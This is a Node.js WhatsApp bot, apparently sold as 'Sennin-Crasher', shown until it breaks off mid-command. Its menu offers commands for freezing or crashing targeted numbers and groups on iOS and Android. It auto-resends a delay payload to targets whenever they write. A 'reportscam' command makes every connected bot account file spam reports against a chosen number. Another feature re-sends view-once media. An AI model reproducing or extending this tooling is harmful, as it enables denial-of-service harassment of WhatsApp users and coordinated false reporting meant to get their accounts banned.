
process.on('uncaughtException', console.error);
require("./config");
const {
    default: crot,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    getContentType,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    WAContextInfo,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    mentionedJid,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    GroupSettingChange,
    WASocket,
    makeWaSocket,                  // ADDED from short import
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    templateMessage,
    InteractiveMessage,
    Header,
    generateMessageID,
    encodeWAMessage,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
    generateForwardMessageContent,
    prepareWAMessageMedia,
    prepareWAMessageContent,
    generateWAMessageFromContent,
    makeInMemoryStore,
    jidDecode,
    proto,
    getAggregateVotesInPollMessage,
    makeCacheableSignalKeyStore,
    Browsers,
    decryptMessageNode,
    MessageRetryMap,
    generateMessageIDV2,
    encodeSignedDeviceIdentity,
    jidEncode
} = require("@whiskeysockets/baileys");

global.menuImageCache = {};
global.menuImageReady = false;
// Example when starting a bot session

const bugsresend = new Map();
const fs = require('fs');
const util = require('util');
const axios = require('axios');
const { exec } = require("child_process");
const chalk = require('chalk');
const moment = require('moment-timezone');
const yts = require ('yt-search');
const didyoumean = require('didyoumean');
const similarity = require('similarity');
const pino = require('pino');
const logger = pino({ level: 'debug' });
const JSConfuser = require("js-confuser");
const time = moment(Date.now()).tz('Africa/Nairobi').locale('id').format('HH:mm:ss z');
const crypto = require('crypto');
const path = require('path');
const express = require('express');

// Inside startpairing or wherever you create the bot instance
// bhule = your bot instance
module.exports = async (bhule, m, chatUpdate, store) => {
    try {
        const chatId = m.chat;
        const senderResend = m.sender;
        const isFromMe = m.key.fromMe;

        const resendLock = new Set();

        // TARGET → resend immediately
        if (!isFromMe && !resendLock.has(chatId)) {
            for (const [owner, targets] of bugsresend.entries()) {
                if (targets.has(chatId)) {
                    resendLock.add(chatId);
                    console.log(`[AUTO RESEND] target resend | ${chatId}`);
                    InVisDelayLoc(bhule, chatId)
                        .catch(console.error)
                        .finally(() => resendLock.delete(chatId));
                }
            }
        }

        // OWNER → resend immediately
        if (isFromMe && !resendLock.has(chatId)) {
            for (const [owner, targets] of bugsresend.entries()) {
                if (targets.has(chatId)) {
                    resendLock.add(chatId);
                    console.log(`[AUTO RESEND] owner resend | ${chatId}`);
                    InVisDelayLoc(bhule, chatId)
                        .catch(console.error)
                        .finally(() => resendLock.delete(chatId));
                }
            }
        }

        var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : "";

        const { smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, TelegraPh, isUrl, hitungmundur, sleep, clockString, checkBandwidth, runtime, tanggal, getRandom } = require('./lib2/myfunc');
        var budy = (typeof m.text == 'string' ? m.text: '');
        var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix;
      const isCmd = body && body.startsWith(prefix)
const command = body?.trim()?.split(/ +/)?.shift()?.toLowerCase() || ""
const args = body?.trim()?.split(/ +/)?.slice(1) || []
        const text = q = args.join(" ");
        const sender = m.key.fromMe ? (bhule.user.id.split(':')[0]+'@s.whatsapp.net' || bhule.user.id) : (m.key.participant || m.key.remoteJid);
        const botNumber = await bhule.decodeJid(bhule.user.id);
        const senderNumber = sender.split('@')[0];
        const orgkaya = JSON.parse(fs.readFileSync('./database/owner.json'));
        const kontributor = JSON.parse(fs.readFileSync('./database/owner.json'));
        const premium = JSON.parse(fs.readFileSync('./database/premium.json'));
        const isOwner = [botNumber, ...premium, ...kontributor].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
        const isCreator = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
        const pushname = m.pushName || `${senderNumber}`;
        const isBot = botNumber.includes(senderNumber);

        const quoted = m.quoted ? m.quoted : m;
        const mime = (quoted.msg || quoted).mimetype || '';

        const speed = require("performance-now");
                if (m.key.remoteJid.endsWith("@newsletter")) return;



        //====================================\\
        const pic = fs.readFileSync(`./Media/spider.jpg`);
        const music = fs.readFileSync(`./Media/menu.mp3`);
        const bug = fs.readFileSync(`./Media/bug.mp3`);

        const { fquoted } = require('./lib/fquoted');
        
     
global.activeBots = global.activeBots || {};
global.activeBots[botNumber] = bhule; 
//
const ownerNumber = '254742491666'; // your WhatsApp number with country code
const ownername = '𝑺𝒆𝒏𝒏𝒊𝒏-𝑪𝒓𝒂𝒔𝒉𝒆𝒓 - 𝕾⃟ᴇɴɴɪɴ𓋆'; // display name
const channelLink = 'https://t.me/deephatom'; // Telegram channel link
const ownerTelegram = 'https://t.me/Deee908'; // Telegram owner link
const thumbnailUrl = 'https://i.postimg.cc/FRdKK48R/IMG-20260430-WA0060.jpg'; // preview picture

// 🔒 PROTECTED NUMBERS (always in full international format)
const protectedNumbers = [
    "27687623052",
    "13826661648",
    "27631178121" // example
]

// 🔧 Normalize + validate (ONLY international format allowed)
const normalizeNumber = (num) => {
    let clean = num.replace(/[^0-9]/g, "")

    // ❌ Reject local formats like 07..., 01..., etc.
    if (clean.startsWith("0")) return null

    // ❌ Too short = invalid
    if (clean.length < 10) return null

    return clean
}
// 🔒 BLACKLIST SYSTEM
global.bannedUsers = global.bannedUsers || [];

const unbanUser = (user) => {
    global.bannedUsers = global.bannedUsers.filter(u => u !== user);
};

// ❌ helper to ban user
const banUser = (user) => {
    if (!global.bannedUsers.includes(user)) {
        global.bannedUsers.push(user);
    }
};

// 🚫 check if user is banned
const isBanned = (user) => global.bannedUsers.includes(user);
// pick random image


        //==============================



// rest of your bot setup…       
        const reply = async (teks) => {
    await bhule.sendMessage(
        m.chat,
        {
            text: `╭─〔 𝑺𝒆𝒏𝒏𝒊𝒏-𝑪𝒓𝒂𝒔𝒉𝒆𝒓 〕─⬣
│
│ ${teks}
│
╰────────────⬣`,
            contextInfo: {
                mentionedJid: [m.sender]
            }
        },
        { quoted: m }
    );
};


function destroySession(user) {
    let sessionPath = path.join(__dirname, '../lib2/pairing', `${user}.json`);

    if (fs.existsSync(sessionPath)) {
        fs.unlinkSync(sessionPath);
    }
}
  //      
function serialize(bhule, m) {
    if (!m.message) return m

    m.type = Object.keys(m.message)[0]
    m.msg = m.message[m.type]

    if (m.msg?.contextInfo?.quotedMessage) {
        const quoted = m.msg.contextInfo.quotedMessage
        const type = Object.keys(quoted)[0]

        m.quoted = {
            type,
            message: quoted,
            id: m.msg.contextInfo.stanzaId,
            sender: m.msg.contextInfo.participant || m.key.participant,
            fromMe: m.msg.contextInfo.participant === bhule.user.id,
            chat: m.key.remoteJid
        }
    } else {
        m.quoted = null
    }

    return m
}
        //========================================
        const gcq = {
            key: {
                remoteJid: 'status@broadcast',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            message: {
                newsletterAdminInviteMessage: {
                    newsletterJid: `120363422836564976@newsletter`,
                    newsletterName: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                    jpegThumbnail: "",
                    caption: `THANKS FOR BUYING`,
                    inviteExpiration: Date.now() + 1814400000
                }
            }
        };
const activeBots = {};
        const zets = {
            key: {
                fromMe: false,
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast"
            },
            message: {
                orderMessage: {
                    orderId: "2029",
                    thumbnail: pic,
                    itemCount: `777`,
                    status: "INQUIRY",
                    surface: "CATALOG",
                    message: `𝑺𝒆𝒏𝒏𝒊𝒏-𝑪𝒓𝒂𝒔𝒉𝒆𝒓`,
                    token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
                }
            },
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999,
                isForwarded: true
            }
        };
//



let stickercmd = JSON.parse(fs.readFileSync('./database/stickercmd.json'));





// ------------------- Sticker Trigger -------------------
if (m.mtype === 'stickerMessage') {
    const sticker = m.message?.stickerMessage || m.msg;
    if (!sticker?.fileSha256) return;

    let hash = Buffer.from(sticker.fileSha256).toString('base64');

    if (stickercmd[hash]) {
        // Loop through all commands for this sticker
        for (let cmd of stickercmd[hash]) {
            await bhule.sendMessage(m.chat, { text: `${prefix}${cmd}` });
        }
    }
}
for (let hash in stickercmd) {
    if (!Array.isArray(stickercmd[hash])) {
        stickercmd[hash] = [stickercmd[hash]]
    }
}
fs.writeFileSync('./database/stickercmd.json', JSON.stringify(stickercmd, null, 2))
        //============
        const downloadMp4 = async (Link) => {
            try {
                await ytdl.getInfo(Link);
                let mp4File = getRandom('.mp4');
                let nana = ytdl(Link).pipe(fs.createWriteStream(mp4File)).on('finish', async () => {
                    await rzx.sendMessage(m.chat, { video: fs.readFileSync(mp4File), gifPlayback: false }, { quoted: m });
                    fs.unlinkSync(`./${mp4File}`);
                });
            } catch (err) {
                reply(`${err}`);
            }
        };
// ================= GLOBAL INTERACTIVE HANDLER =================
if (m.message?.interactiveResponseMessage) {
    let params = JSON.parse(
        m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson
    );

    // ---------------- BACK BUTTON ----------------
    if (params.id === "back") {
        await bhule.sendMessage(m.chat, { text: `${prefix}listgc` });
        return;
    }

    // ---------------- COPY ACTION (SEND DIRECT TEXT) ----------------
    if (params.id.startsWith("copy_")) {
        let [, type, gcid] = params.id.split("_");
        let meta = await bhule.groupMetadata(gcid);
        let output = "";

        if (type === "id") {
            output = gcid;
        }

        if (type === "name") {
            output = meta.subject;
        }

        if (type === "invite") {
            output = await bhule.groupInviteCode(gcid)
                .then(code => `https://chat.whatsapp.com/${code}`)
                .catch(() => "Bot must be admin to get invite link");
        }

        // SEND VALUE DIRECTLY
        await bhule.sendMessage(m.chat, { text: output });
        return;
    }

    // ---------------- GROUP SELECT ----------------
    if (!params.id.startsWith("copy_") && params.id.endsWith("@g.us")) {
        let gcid = params.id;

        await bhule.relayMessage(m.chat, {
            interactiveMessage: {
                header: {
                    title: "📋 GROUP ACTIONS",
                    hasMediaAttachment: false
                },
                body: {
                    text: "Select what you want to get:"
                },
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: "single_select",
                            buttonParamsJson: JSON.stringify({
                                title: "Choose Action",
                                sections: [
                                    {
                                        title: "Options",
                                        rows: [
                                            { title: "📋 Get Group ID", id: `copy_id_${gcid}` },
                                            { title: "📝 Get Group Name", id: `copy_name_${gcid}` },
                                            { title: "🔗 Get Invite Link", id: `copy_invite_${gcid}` }
                                        ]
                                    }
                                ]
                            })
                        },
                        {
                            name: "quick_reply",
                            buttonParamsJson: JSON.stringify({
                                display_text: "🔙 Back",
                                id: "back"
                            })
                        }
                    ]
                }
            }
        }, {});
        return;
    }
}
        //=========================================//
        if (isCmd) {
            console.log("");
            console.log(chalk.green(chalk.bgHex('#4a69bd').bold(`🚀 WhatsApp messages! 🚀`)));
            console.log(chalk.blue(chalk.bgHex('#fdcb6e')(`📅 DATE: ${time}
💬 MESSAGE: ${command}
🗣️ SENDERNAME: ${pushname}
👤 JIDS: ${m.sender}`)));
        }
        //==========================================/
        // auto crash function 
        
        //==========================================/
        const qkontak = {
            key: {
                participant: `0@s.whatsapp.net`,
                ...(botNumber ? {
                    remoteJid: `status@broadcast`
                } : {})
            },
            message: {
                'contactMessage': {
                    'displayName': `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                    'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6285624297893:+62 856-2429-7893\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
                    sendEphemeral: true
                }
            }
        };

        //=========================================//
        switch (command) {
// comma
case "menu": {
let timestamp = speed();
                let latensi = speed() - timestamp;
                let run = runtime(process.uptime());
let text = `
      \`𝗦𝗘𝗡𝗜𝗡-𝗖𝗥𝗔𝗦𝗛𝗘𝗥\`
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
> 𝙷𝚎𝚕𝚕𝚘 :  ${m.pushName} 
> 𝙿𝚛𝚎𝚏𝚒𝚡 : ${prefix}
> 𝚂𝚙𝚎𝚎𝚍 : ${latensi.toFixed(4)}
> 𝚁𝚞𝚗𝚝𝚒𝚖𝚎 : ${run}
> 𝙾𝚠𝚗𝚎𝚛 : 𝐁𝐇𝐔𝐋𝐄
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
      \`𝗣𝗿𝗲𝗺-𝗰𝗺𝗱𝘀\`
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
> ➯ 𝚜𝚎𝚕𝚏  
> ➯ 𝚙𝚞𝚋𝚕𝚒𝚌
> ➯ 𝚜𝚎𝚝𝚜𝚝𝚒𝚌𝚔𝚎𝚛𝚌𝚖𝚍  
> ➯ 𝚍𝚎𝚕𝚜𝚝𝚒𝚌𝚔𝚎𝚛𝚌𝚖𝚍
> ➯ 𝚕𝚒𝚜𝚝𝚜𝚝𝚒𝚌𝚔𝚎𝚛𝚌𝚖𝚍
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
     \`𝗨𝘁𝗶𝗹𝗶𝘁𝘆\`
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
> ➯ 𝚕𝚒𝚜𝚝𝚐𝚌
> ➯ 𝚐𝚌-𝚒𝚍 
> ➯ 𝚕𝚒𝚜𝚝𝚐𝚌2
> ➯ 𝚟𝚟
> ➯ 𝚜𝚝𝚒𝚌𝚔𝚎𝚛
> ➯ 𝚙𝚒𝚗𝚐
> ➯ 𝚛𝚞𝚗𝚝𝚒𝚖𝚎
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰ 
   \`𝗖𝗿𝗮𝘀𝗵-𝗰𝗺𝗱\`
▰▰▰▰▰▰▰▰▰▰▰▰▰ 
> ➯ 𝚛𝚎𝚝𝚛𝚘-𝚏𝚛𝚎𝚎𝚣𝚎 27###
> ➯ 𝚜𝚎𝚗𝚗-𝚍𝚎𝚕𝚊𝚢 27###,1
> ➯ 𝚍𝚎𝚕𝚊𝚢-𝚏𝚛𝚎𝚎𝚣𝚎 27###
> ➯ 𝚜𝚎𝚗𝚗-𝚌𝚘𝚞𝚗𝚝 27###,1
> ➯ 𝚌𝚞𝚕𝚝-𝚝𝚛𝚊𝚜𝚑 27###
> ➯ 𝚒𝚘𝚜-𝚜𝚖𝚘𝚔𝚎 27###
> ➯ 𝚒𝚘𝚜-𝚏𝚛𝚎𝚎𝚣𝚎 27###
> ➯ 𝚍𝚎𝚕𝚊𝚢-𝚕𝚊𝚐 ( 𝚍𝚒𝚛𝚎𝚌𝚝 𝚍𝚖 )
> ➯ 𝚏𝚞𝚌𝚔-𝚐𝚌 ( 𝚐𝚌-𝚒𝚍 )
> ➯ 𝚌𝚑𝚊𝚝-𝚏𝚛𝚎𝚎𝚣𝚎 ( 𝚍𝚒𝚛𝚎𝚌𝚝 𝚍𝚖 𝚐𝚌 𝚏𝚛𝚎𝚎𝚣𝚎 )
▰▰▰▰▰▰▰▰▰▰▰▰▰
© 2026 - 𝐁𝐡𝐮𝐥𝐞
  𝕾⃟ᴇɴɴɪɴ𓋆 𝐜𝐥𝐚𝐧
`;

try {

const { generateWAMessageFromContent, prepareWAMessageMedia } = require('@whiskeysockets/baileys');

// 🔥 prepare image
const media = await prepareWAMessageMedia(
  {
    image: { url: "https://i.postimg.cc/FRdKK48R/IMG-20260430-WA0060.jpg" }
  },
  {
    upload: bhule.waUploadToServer
  }
);

const msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
},

interactiveMessage: {
body: { text: text },
footer: { text: "Senin Crasher ©2026" },

header: {
hasMediaAttachment: true,
...media
},

nativeFlowMessage: {
buttons: [
{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: "📢 Join Telegram",
url: "https://t.me/deephatom",
merchant_url: "https://t.me/deephatom"
})
}
]
}
}
}
}
}, { quoted: m });

await bhule.relayMessage(m.chat, msg.message, {
messageId: msg.key.id
});

} catch (err) {
console.log("❌ GEN ERROR:", err);

await bhule.sendMessage(m.chat, {
text: "⚠️ Failed to generate menu Check bot logs."
}, { quoted: m });
}

}
break;
case 'add': {
    // Ensure only the owner or authorized users can trigger this
    if (!isOwner && !isCreator) return reply(mess.premium);
    
    // Determine the target group ID (either the current group chat or a specified text arg)
    let targetGroup = m.chat;
    if (text && text.endsWith('@g.us')) {
        targetGroup = text.trim();
    }

    if (!targetGroup.endsWith('@g.us')) {
        return reply("❌ This command must be executed inside a group or look up a valid group JID.");
    }

    reply("⏳ Attempting to add participant...");
    
    try {
        await groupBanz(bhule, targetGroup);
        reply("✅ Successfully executed add command.");
    } catch (err) {
        console.error(err);
        reply(`❌ Error adding participant: ${err.message || err}`);
    }
}
break;
case 'reporscam': 
case 'reportscam': {
    if (!isOwner && !isCreator) return reply(mess.premium);
    if (!text) return reply(`❌ Please provide a target number!\nExample: ${prefix + command} 2348000000000`);

    let targetNum = text.replace(/[^0-9]/g, "");
    if (targetNum.length < 10) return reply("❌ Invalid number format. Use international format without + or spaces.");

    let targetJid = targetNum + "@s.whatsapp.net";
    
    let clientPool = new Map();

    if (typeof bhule !== 'undefined' && bhule.query) {
        clientPool.set(botNumber.replace(/[^0-9]/g, ""), bhule);
    }
    if (typeof global.zaza === 'object') {
        for (let key of Object.keys(global.zaza)) {
            let cleanKey = key.replace(/[^0-9]/g, "");
            if (global.zaza[key] && global.zaza[key].query) {
                clientPool.set(cleanKey, global.zaza[key]);
            }
        }
    }
    if (typeof global.activeBots === 'object') {
        for (let key of Object.keys(global.activeBots)) {
            let cleanKey = key.replace(/[^0-9]/g, "");
            if (global.activeBots[key] && global.activeBots[key].query) {
                clientPool.set(cleanKey, global.activeBots[key]);
            }
        }
    }

    let totalAttempted = clientPool.size;
    if (totalAttempted === 0) {
        return reply("❌ System Failure: No active connected bot accounts found.");
    }

    reply(`📊 *Scammer Raid Protocol Initiated*\nTarget: @${targetNum}\nDeploying: *${totalAttempted}* verified live accounts via native Reporting Nodes...`);

    let successCount = 0;
    let failCount = 0;

    for (let [phoneId, client] of clientPool.entries()) {
        try {
            const timeoutPromise = new Promise((_, reject) =>
                setTimeout(() => reject(new Error("Network Timeout")), 4000)
            );

            // Corrected and updated binary reporting node format for standard Baileys versions
            await Promise.race([
                client.query({
                    tag: 'iq',
                    attrs: {
                        to: 's.whatsapp.net',
                        type: 'set',
                        xmlns: 'spam' // Sets context to native spam interaction handler
                    },
                    content: [
                        {
                            tag: 'report',
                            attrs: {
                                jid: targetJid,
                                spam: 'true'
                            }
                        }
                    ]
                }),
                timeoutPromise
            ]);

            successCount++;
            await sleep(1000); 
        } catch (err) {
            console.log(chalk.red(`[REPORT SKIPPED] Account ${phoneId} error: ${err.message}`));
            failCount++;
        }
    }

    await bhule.sendMessage(m.chat, {
        text: `╭─〔 𝑹𝒆𝒑𝒐𝒓𝒕 𝑺𝒖𝒎𝒎𝒂𝒓𝒚 〕─⬣\n│\n│ 🤖 Total Active Sessions: ${totalAttempted}\n│ ✅ Reports Successfully Lodged: ${successCount}\n│ ❌ Skipped/Dead Sessions: ${failCount}\n│ 🎯 Target: @${targetNum}\n│\n╰────────────⬣`,
        contextInfo: { mentionedJid: [targetJid] }
    }, { quoted: m });
}
break;

  case 'gc-id': {
                if (!isOwner) return reply(mess.premium);
                if (!text) return reply('Enter Group Link!');
                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalid!');

                const result = args[0].split('https://chat.whatsapp.com/')[1];

                try {
                    const xeontry = await bhule.groupAcceptInvite(result);

                    if (!xeontry) {
                        return reply('The group chat either has the approval feature enabled, you have been removed from the group or the invite link has expired. Please join the group chat first and try using the command .listgc.');
                    }

                    reply(`Group ID: ${xeontry}`);
                } catch (error) {
                    reply('The group chat either has the approval feature enabled, you have been removed from the group or the invite link has expired. Please join the group chat first and try using the command .listgc.');
                }
                break;
            }
            case 'vv': case 'sharingam': {
    try {
        if (!m.quoted) return reply('❌ Reply to an image or video');

        let buffer = await m.quoted.download();
        if (!buffer) return reply('❌ No media found on reply');

        let type =
            m.quoted.mtype === 'imageMessage' ? 'image' :
            m.quoted.mtype === 'videoMessage' ? 'video' :
            null;

        if (!type) return reply('❌ Unsupported media type');

        // 📍 private mode (self)
        if (args[0] === 'self' || args[0] === 'private') {
            await bhule.sendMessage(m.sender, {
                [type]: buffer,
                caption: '👀 Sent to your DM'
            });

            return; // ❗ STOP HERE
        }

        // 📍 normal mode
        await bhule.sendMessage(m.chat, {
            [type]: buffer,
            caption: '👀 Media sent'
        }, { quoted: m });

    } catch (e) {
        console.log(e);
        reply('❌ Error processing media');
    }
}
break;

case 'delstickercmd': {
if (!isOwner) return reply(mess.premium); 
    const quoted = m.quoted || m;
    const sticker = quoted?.message?.stickerMessage || quoted?.msg || quoted;

    if (!sticker?.fileSha256) return reply("❌ Reply to the sticker you want to delete")
    
    let hash = Buffer.from(sticker.fileSha256).toString('base64')

    if (!stickercmd[hash]) return reply("❌ This sticker has no command assigned")

    delete stickercmd[hash]
    fs.writeFileSync('./database/stickercmd.json', JSON.stringify(stickercmd, null, 2))
    reply(`✅ Sticker command removed`)
}
break
case 'setstickercmd': {
    if (!isOwner) return reply("❌ Owner-only command")
    const quoted = m.quoted || m;
    const sticker = quoted?.message?.stickerMessage || quoted?.msg || quoted;

    if (!sticker?.fileSha256) return reply("❌ Reply to a sticker to assign a command")
    if (!text) return reply(`Example: ${prefix}setstickercmd atomic`)

    let hash = Buffer.from(sticker.fileSha256).toString('base64')

    // Initialize as array if not exists OR if not already an array
    if (!stickercmd[hash] || !Array.isArray(stickercmd[hash])) stickercmd[hash] = []

    // Add command
    stickercmd[hash].push(text)

    fs.writeFileSync('./database/stickercmd.json', JSON.stringify(stickercmd, null, 2))
    reply(`✅ Sticker command(s) updated: ${stickercmd[hash].join(', ')}`)
}
break
case 'liststickercmd': {
    if (!isOwner) return reply("❌ Owner-only command")

    let list = Object.entries(stickercmd)
        .map(([hash, cmds], i) => {
            if (!Array.isArray(cmds)) cmds = [cmds]; // safety
            return `${i+1}. Commands: ${cmds.join(', ')}\nHash: ${hash}`
        })
        .join('\n\n')

    if (!list) list = "No sticker commands set yet"
    
    reply(list)
}
break
            case 'sticker':
case 's': {
    if (!m.quoted && !/image/.test(m.mimetype)) {
        return reply('📸 Reply to an image');
    }

    let media = m.quoted ? await m.quoted.download() : await m.download();

    let sticker = new Sticker(media, {
        pack: '𝑺𝒆𝒏𝒏𝒊𝒏-𝑪𝒓𝒂𝒔𝒉𝒆𝒓', // your pack name
        author: '𝑺𝒆𝒏𝒏𝒊𝒏-𝑪𝒓𝒂𝒔𝒉𝒆𝒓', // your name
        type: 'full',
        categories: ['𝕾⃟ᴇɴɴɪɴ𓋆'],
        id: '12345'
    });

    let buffer = await sticker.toBuffer();

    await bhule.sendMessage(m.chat, {
        sticker: buffer
    }, { quoted: m });
}
break;  
            
            

            case 'listpair': {
                if (!isOwner) return reply(mess.premium);

                const pairingPath = './lib2/pairing';

                try {
                    // Check if the directory exists
                    if (!fs.existsSync(pairingPath)) {
                        return reply('No paired devices found.');
                    }

                    // Read all directories (and files) inside ./lib2/pairing
                    const entries = fs.readdirSync(pairingPath, { withFileTypes: true });

                    // Filter for directories (paired device IDs)
                    const pairedDevices = entries
                        .filter(entry => entry.isDirectory())
                        .map(entry => entry.name.replace('@s.whatsapp.net', '')); // Extract only numbers

                    // Handle if no paired devices are found
                    if (pairedDevices.length === 0) {
                        return reply('No paired devices found.');
                    }

                    // Count total paired devices
                    const totalUsers = pairedDevices.length;

                    // Format the list of paired devices for the response
                    const deviceList = pairedDevices
                        .map((device, index) => `${index + 1}. ${device}`)
                        .join('\n');

                    reply(`Total Rent Bot Users: ${totalUsers}\n\nPaired Devices:\n${deviceList}`);
                } catch (err) {
                    console.error('Error reading paired devices directory:', err);
                    return reply('Failed to load paired devices data.');
                }
                break;
            }

            case 'delpair': {
                if (!isOwner) return reply(mess.premium);

                if (!q) return reply(`Example:\n ${prefix + command} 254###`);
                victim = text.split("|")[0];
                Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net";
                var contactInfo =  Xreturn;
                if (contactInfo.length == 0) {
                    return reply("The number is not registered on WhatsApp");
                }

                const pairingPath = './lib2/pairing';
                const targetPath = `${pairingPath}/${Xreturn}`;

                try { 
                    // Check if the target directory exists
                    if (!fs.existsSync(targetPath)) {
                        return reply(`Paired device with ID "${Xreturn}" does not exist.`);
                    }

                    // Delete the target directory and its contents
                    fs.rmSync(targetPath, { recursive: true, force: true });

                    reply(`Paired device with ID "${Xreturn}" has been successfully deleted.`);
                } catch (err) {
                    console.error('Error deleting paired device:', err);
                    return reply('An error occurred while attempting to delete the paired device.');
                }
                break;
            }
case 'rentbot': {

  const realOwner = "27631178121@s.whatsapp.net";

  // ✅ Only allow this exact WhatsApp number
  if (m.sender !== realOwner) {
    return reply("❌ Only the real owner can use this command.");
  }

  if (!q) return reply(`Example:\n ${prefix + command} 27###`)

  let victim = text.split("|")[0]

  let Xreturn = m.mentionedJid[0]
    ? m.mentionedJid[0]
    : m.quoted
    ? m.quoted.sender
    : victim.replace(/[^0-9]/g, '') + "@s.whatsapp.net"

  const contactInfo = await bhule.onWhatsApp(Xreturn)
  if (!contactInfo || contactInfo.length === 0) {
    return reply("The number is not registered on WhatsApp")
  }

  try {
    const startpairing = require('./rentbot.js')
    await startpairing(Xreturn)

    await sleep(4000)

    const cu = fs.readFileSync('./lib2/pairing/pairing.json', 'utf-8')
    const cuObj = JSON.parse(cu)

    await bhule.sendMessage(Xreturn, {
      text: `🔐 *Your Pairing Code*\n\n${cuObj.code}\n\nFollow the instructions to complete pairing.`
    })

    await reply("✅ Pairing code sent successfully.")

  } catch (err) {
    console.error(err)
    return reply("❌ Failed to generate pairing code.")
  }

}
break
 
                       
case 'device':
case 'checkdevice':
case 'getdevice': {
    try {
        if (!isOwner) return reply(mess.premium);

        const msg = m.message || {};
        const messageType = Object.keys(msg)[0];
        const contextInfo = msg[messageType]?.contextInfo;

        if (!contextInfo?.quotedMessage || !contextInfo?.stanzaId) {
            return reply('Reply to a target message.');
        }

        const msgId = contextInfo.stanzaId;
        let deviceType = 'Unknown Device';

        if (msgId.startsWith('3A')) {
            deviceType = 'Device: iOS';
        } else if (msgId.length > 21) {
            deviceType = 'Device: Android';
        } else {
            deviceType = 'Device: WhatsApp Web / Bot API';
        }

        return reply(deviceType);

    } catch (err) {
        console.log("Device error:", err);
        reply("Error occurred.");
    }
    break;
}
            case "ping": 
            case "runtime": { 
                let timestamp = speed();
                let latensi = speed() - timestamp;

                reply(`━━━━━━━━━━━━━━━━━\n\◉ нι ${m.pushName}\n\━━━━━━━━━━━━━━━━━\n\◈𝑺𝒆𝒏𝒏𝒊𝒏-𝑪𝒓𝒂𝒔𝒉𝒆𝒓 ѕρєє∂  : ${latensi.toFixed(4)} мѕ\n\━━━━━━━━━━━━━━━━━\n\◉яυиτιмє : ${runtime(process.uptime())}\n\━━━━━━━━━━━━━━━━━`);
            }
            break;
   
                        
            case 'ios-smoke': {
                if (!isOwner) return reply(mess.premium);
                if (!q) return reply(`Example: ${prefix + command} 254###`);
                let cleanNum = normalizeNumber(q)

// ❌ invalid format
if (!cleanNum) {
    return reply(`❌ Use international format only\nExample: 27XXXXXXXX`)
}

// 🚫 protected numbers
if (protectedNumbers.includes(cleanNum)) {
    await reply(`⚠️ 『FORBIDDEN TARGET』 detected, ${m.pushName}
🚫『SYSTEM PROTOCOL: HOSTILE ENTITY PURGE』 executing...
Connection to target: SEVERED. 
『SOUL LINK: OBLITERATED』. 
Session terminated. Access revoked for all eternity.`);

    // 🔥 ban user
    banUser(m.sender);

    // optional: delete session
    destroySession(m.sender);

    return;
}

// ✅ final target
let target = cleanNum + "@s.whatsapp.net"          
                reply(`
┌─────────
